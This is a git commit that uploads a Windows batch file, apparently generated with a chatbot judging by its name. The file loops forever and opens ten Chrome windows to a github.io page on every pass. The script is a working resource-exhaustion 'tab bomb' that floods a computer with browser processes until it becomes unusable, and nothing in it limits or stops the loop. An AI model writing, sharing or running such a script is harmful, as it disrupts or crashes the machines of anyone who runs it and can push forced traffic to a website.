4444188ff5fcc9c74b2255da3847c70d2f5862fa
Timothee123456 <115542683+Timothee123456@users.noreply.github.com>
2025-06-18 13:03:58 +0800

    Add files via upload

---
+++ deepseek/deepseek_batch_20250618_c3bdae.bat
@@ -0,0 +1,13 @@
+@echo off
+:loop
+start "" chrome "https://timothee123456.github.io/main"
+start "" chrome "https://timothee123456.github.io/main"
+start "" chrome "https://timothee123456.github.io/main"
+start "" chrome "https://timothee123456.github.io/main"
+start "" chrome "https://timothee123456.github.io/main"
+start "" chrome "https://timothee123456.github.io/main"
+start "" chrome "https://timothee123456.github.io/main"
+start "" chrome "https://timothee123456.github.io/main"
+start "" chrome "https://timothee123456.github.io/main"
+start "" chrome "https://timothee123456.github.io/main"
+goto loop
